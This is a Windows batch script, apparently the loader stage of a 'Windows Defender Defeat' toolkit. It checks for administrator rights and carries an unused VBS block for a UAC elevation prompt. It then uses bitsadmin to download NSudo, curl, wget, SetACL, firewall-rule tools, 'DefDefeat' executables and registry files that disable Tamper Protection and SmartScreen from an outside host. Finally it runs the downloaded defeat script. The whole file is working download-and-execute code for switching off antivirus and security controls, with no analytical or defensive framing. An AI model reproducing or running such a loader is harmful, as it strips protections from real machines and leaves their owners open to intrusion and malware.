@echo off
rem *******************************************************
rem
rem AllDef-ProgLoad-New.bat
rem This Script Downloads All Necessary Programs
rem for Microsoft Windows 10 Windows Defender Defeat
rem
rem Function Uses Bitsadmin.exe for Program Downloads
rem
rem PARAMETERS:	NONE
rem RETURNS:	0 if Success Script Runs
rem		1 if Error at Downloading File
rem		2 if Some Executable Error
rem		16 if Checking Integrity Failed
rem		17 if Runs without Elevated Privileges
rem
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=DefenderDefeat
SET FIRM_NAME=NIT

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem
echo Define Folders...
rem
set curdirforurl=%CD%
set pathCMD=%SystemRoot%\System32
set allDefeatPath=%TEMP%\AllDefeat

echo Define Protected Directories...
rem
set NITPROFILE=%ALLUSERSPROFILE%\%FIRM_NAME%
set PRODPROFILE=%ALLUSERSPROFILE%\%FIRM_NAME%\%PRODUCT_NAME%

echo Define Programs...
set CMDEXE=%pathCMD%\cmd.exe
set ATTRIBEXE=%pathCMD%\attrib.exe
set BITSADMINEXE=%pathCMD%\bitsadmin.exe
set REGEXE=%pathCMD%\reg.exe

rem
rem Set Directories Path
rem
rem echo Set LocalFolder...
rem
set LocalFolder=%allDefeatPath%

echo Create All Defeat Path...
rem
if not exist %allDefeatPath% md %allDefeatPath%

rem
echo Check Integrity...
rem
if not exist %CMDEXE% echo %CMDEXE% not exists && exit /b 16
if not exist %ATTRIBEXE% echo %ATTRIBEXE% not exists && exit /b 16
if not exist %BITSADMINEXE% echo %BITSADMINEXE% not exists && exit /b 16
if not exist %REGEXE% echo %REGEXE% doesn't exist && exit /b 16
if not exist %TPDL% echo %TPDL% not exists && exit /b 16
if not exist "%ALLUSERSPROFILE%" echo %ALLUSERSPROFILE% not found && exit /b 16

if not exist %LocalFolder% echo %LocalFolder% doesn't exist && exit /b 16

rem set Remote Folders
rem
set http_BaseDir01=/PROGS/
set http_ProgDir01=%http_BaseDir01%%FIRM_NAME%/%PRODUCT_NAME%/
set http_ChckDir01=%http_ProgDir01%DefNew/
set REG_FOLD=/Exponenta/Distrib/LIB/LIB-REG/
rem Set Hosts
rem
set http_pref01=http
set http_host01=file.netip4.ru
set http_port01=80
rem
echo Set Hosts...
rem
set host01=%http_pref01%://%http_host01%:%http_port01%%http_ChckDir01%
set host02=%http_pref01%://%http_host01%:%http_port01%%http_ProgDir01%
set host03=%http_pref01%://%http_host01%:%http_port01%%REG_FOLD%
echo Host01 = %host01%
echo Host02 = %host02%
echo Host03 = %host03%

title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
exit /b 17
rem
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    %wscriptexe% "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B 0

:gotAdmin
echo Run as Admin...

rem
echo Define Packets Variables...
rem
set NSUDO=NSudo.exe
set CURL=CURL.EXE
set LIBCURL=LIBCURL.DLL
set WGET=wget.exe
set DefenderDefeat=DefDefeat01.exe
set DefenderEnfeat=DefEnfeat01.exe
set SetACL=SetACL.exe
set WindowsFireWallAddRules=WindowsFireWallAddRules.exe
set WindowsFireWallDelRules=WindowsFireWallDelRules.exe
set DefDefeat=DefDefeat.cmd
set DefDefSoft=DefDef.Soft.cmd
set DefDefeatSoftACL=DefDefeat.Soft.ACL.bat
set FoldersCreate=FoldersCreate.bat
set DefSmScr=Disable-SmartScreen.reg
set DisTamper=Disable-TamperProtection.reg
set DefDefResx=DefDefender.resx
set WFW01Resx=WFireWall01.resx

echo Download Programs...
rem
%BITSADMINEXE% /transfer ACTTASKDOWNLOAD /DOWNLOAD /priority FOREGROUND ^
%host03%%DisTamper% "%PRODPROFILE%\%DisTamper%" ^
%host03%%DefSmScr% "%PRODPROFILE%\%DefSmScr%" ^
%host02%%FoldersCreate% "%PRODPROFILE%\%FoldersCreate%" ^
%host02%%NSUDO% "%PRODPROFILE%\%NSUDO%" ^
%host02%%CURL% "%PRODPROFILE%\%CURL%" ^
%host02%%LIBCURL% "%PRODPROFILE%\%LIBCURL%" ^
%host02%%WGET% "%PRODPROFILE%\%WGET%" ^
%host02%%DefenderDefeat% "%PRODPROFILE%\%DefenderDefeat%" ^
%host02%%DefenderEnfeat% "%PRODPROFILE%\%DefenderEnfeat%" ^
%host02%%DefDefResx% "%PRODPROFILE%\%DefDefResx%" ^
%host02%%SetACL% "%PRODPROFILE%\%SetACL%" ^
%host02%%WindowsFireWallAddRules% "%PRODPROFILE%\%WindowsFireWallAddRules%" ^
%host02%%WindowsFireWallDelRules% "%PRODPROFILE%\%WindowsFireWallDelRules%" ^
%host02%%WFW01Resx% "%PRODPROFILE%\%WFW01Resx%" ^
%host01%%DefDefeat% "%PRODPROFILE%\%DefDefeat%" ^
%host01%%DefDefSoft% "%PRODPROFILE%\%DefDefSoft%" ^
%host01%%DefDefeatSoftACL% "%PRODPROFILE%\%DefDefeatSoftACL%"

if errorlevel 1 echo Error at Downloading Files && exit /b 1

echo Change Current Directory...
rem
cd /d "%PRODPROFILE%"

rem echo Run Defeat Script...
rem
call "%PRODPROFILE%\%DefDefeat%"
if errorlevel 1 echo Script "%PRODPROFILE%\%DefDefeat%" errorlevel %errorlevel% && goto End

echo Success Script Run %0
goto End

:End
echo The End of the Script %0
exit /b 0

